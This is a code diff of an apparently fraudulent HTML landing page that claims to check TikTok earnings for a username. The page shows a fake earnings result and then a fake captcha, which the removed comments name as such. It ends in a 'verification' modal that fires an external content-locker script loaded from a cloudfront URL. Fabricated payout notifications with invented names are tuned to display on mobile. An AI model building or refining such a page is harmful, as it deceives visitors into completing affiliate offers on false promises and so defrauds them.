@@ -8,9 +8,6 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
-<!-- ========================================== -->
-<!-- LOCKER SCRIPT (Ykoun hna bach ykoun ready) -->
-<!-- ========================================== -->
 <script type="text/javascript">
     var TGDNv_tzF_uKZXXc = {
         "it": 4636500,
@@ -20,7 +17,6 @@
 <script src="https://d1chbu4sfo2xhu.cloudfront.net/687fdbf.js"></script>
 
 <style>
-/* --- CSS STYLES --- */
 .tiktok-logo { width: 140px; height: 140px; margin: 0 auto 16px; animation: pulse 2s ease-in-out infinite; }
 .tiktok-logo img { width: 100%; height: 100%; object-fit: contain; display: block; }
 .hero { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 64px 24px; text-align: center; }
@@ -111,8 +107,15 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
 .captcha-links { display: flex; gap: 12px; justify-content: flex-end; font-size: 11px; }
 .captcha-links a { color: #6b7280; text-decoration: none; }
 
-.bottom-notifications { position: fixed; left: 16px; bottom: 16px; width: 320px; z-index: 50; display: none; }
-@media (min-width: 1024px) { .bottom-notifications { display: block; } }
+.bottom-notifications { position: fixed; left: 16px; bottom: 16px; width: 280px; z-index: 50; display: block; }
+@media (max-width: 640px) { 
+    .bottom-notifications { 
+        width: calc(100% - 32px); 
+        max-width: 320px; 
+        left: 50%; 
+        transform: translateX(-50%); 
+    } 
+}
 .bottom-notification-card { background: white; border-radius: 16px; padding: 16px 20px; margin-bottom: 12px; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12); border: 1px solid var(--border); animation: slideInLeft 0.5s ease forwards; }
 .bottom-notification-name { font-weight: 600; font-size: 15px; color: var(--primary); margin-bottom: 4px; }
 .bottom-notification-text { font-size: 14px; color: var(--muted); }
@@ -140,17 +143,14 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
 </head>
 <body>
 
-<!-- Sidebar -->
 <aside class="sidebar animate-fade-in delay-500">
     <div class="sidebar-content">
         <div class="scroll-container" id="notificationScroll"></div>
     </div>
 </aside>
 
-<!-- Bottom Left Floating Notifications -->
 <div class="bottom-notifications" id="bottomNotifications"></div>
 
-<!-- Main Content -->
 <main class="main-content">
     <section class="hero">
         <div class="hero-content">
@@ -233,9 +233,6 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
     </footer>
 </main>
 
-<!-- ========================================== -->
-<!-- 1. FIRST MODAL - Earnings -->
-<!-- ========================================== -->
 <div class="modal-overlay" id="earningsModal">
     <div class="modal-content">
         <button class="modal-close" id="closeModal">
@@ -253,9 +250,6 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
     </div>
 </div>
 
-<!-- ========================================== -->
-<!-- 2. SECOND MODAL - Fake Captcha -->
-<!-- ========================================== -->
 <div class="captcha-overlay" id="captchaModal">
     <div class="captcha-content">
         <button class="captcha-close" id="closeCaptcha">&times;</button>
@@ -275,17 +269,12 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
     </div>
 </div>
 
-<!-- ========================================== -->
-<!-- 3. THIRD MODAL - Locker Trigger (FIXED) -->
-<!-- Hada howa li ghadi yb9a f'wassat chacha, ma ghadich ymchi ltaht! -->
-<!-- ========================================== -->
 <div class="modal-overlay" id="lockerModal">
     <div class="modal-content">
         <h3 class="modal-title">Final Verification Step</h3>
         <p class="modal-disclaimer">
             To prevent bot abuse and activate your monetization dashboard, please complete one quick action from our trusted partner.
         </p>
-        <!-- Hna st3mlna onclick="_iE()" direct kifma tlbti -->
         <button class="btn" onclick="triggerLocker()">
             Continue to Partner Offers
             <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style="margin-left: 8px;">
@@ -297,8 +286,6 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
-    
-    // 1. Elements Declaration
     const form = document.getElementById('earningsForm');
     const usernameInput = document.getElementById('usernameInput');
     const earningsModal = document.getElementById('earningsModal');
@@ -309,9 +296,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const captchaCheckbox = document.getElementById('captchaCheckbox');
     const captchaLabel = document.getElementById('captchaLabel');
     const captchaBox = document.getElementById('captchaBox');
-    const lockerModal = document.getElementById('lockerModal'); // Jdid
+    const lockerModal = document.getElementById('lockerModal');
 
-    // 2. Form Submit Logic
     form.addEventListener('submit', (e) => {
         e.preventDefault();
         if (usernameInput.value.trim()) {
@@ -319,54 +305,45 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // 3. Close Earnings Modal
     closeModalBtn.addEventListener('click', () => {
         earningsModal.classList.remove('active');
     });
 
-    // 4. Start Now -> Opens Captcha
     startNowBtn.addEventListener('click', () => {
         earningsModal.classList.remove('active');
         setTimeout(() => {
             captchaModal.classList.add('active');
-        }, 300);
+        }, 200);
     });
 
-    // 5. Close Captcha Modal
     closeCaptchaBtn.addEventListener('click', () => {
         captchaModal.classList.remove('active');
     });
 
-    // 6. CORE LOGIC: Toggle Captcha -> Show Locker Modal (Machi ltaht!)
     function toggleCaptcha() {
         captchaCheckbox.classList.toggle('checked');
-        
         if (captchaCheckbox.classList.contains('checked')) {
             setTimeout(() => {
-                // Hide Captcha Modal
                 captchaModal.classList.remove('active');
-                
-                // Show Locker Modal f'wassat chacha (Center)
                 if (lockerModal) {
                     lockerModal.classList.add('active');
                 }
-            }, 800); // 800ms fake loading delay
+            }, 400);
         }
     }
 
-    // 7. Captcha Click Listeners
     captchaCheckbox.addEventListener('click', toggleCaptcha);
     captchaLabel.addEventListener('click', toggleCaptcha);
     captchaBox.addEventListener('click', (e) => {
         if (e.target === captchaBox) toggleCaptcha();
     });
 
-    // 8. Close modals on outside click or Escape key
     window.addEventListener('click', (e) => {
         if (e.target === earningsModal) earningsModal.classList.remove('active');
         if (e.target === captchaModal) captchaModal.classList.remove('active');
         if (e.target === lockerModal) lockerModal.classList.remove('active');
     });
+
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape') {
             earningsModal.classList.remove('active');
@@ -375,9 +352,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // ==========================================
-    // NOTIFICATIONS LOGIC
-    // ==========================================
     const notifications = [
         { name: "Grace A.", amount: 1376, initials: "GA", color: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)" },
         { name: "Benjamin E.", amount: 1000, initials: "BE", color: "linear-gradient(135deg, #f093fb 0%, #f5576c 100%)" },
@@ -444,21 +418,17 @@ document.addEventListener('DOMContentLoaded', () => {
     setInterval(showBottomNotification, 8000);
 });
 
-// ==========================================
-// LOCKER TRIGGER FUNCTION (Global)
-// ==========================================
 function triggerLocker() {
     if (typeof window._iE === "function") {
-        window._iE(); // Hada howa li kay7l l'locker dyalk
+        window._iE();
     } else {
-        // Ila l'script mazal ma t7mlch, ntsna chwiya w n3awdo
         setTimeout(() => {
             if (typeof window._iE === "function") {
                 window._iE();
             } else {
                 alert("Chargement des offres en cours, veuillez cliquer à nouveau dans un instant.");
             }
-        }, 1500);
+        }, 500);
     }
 }
 </script>
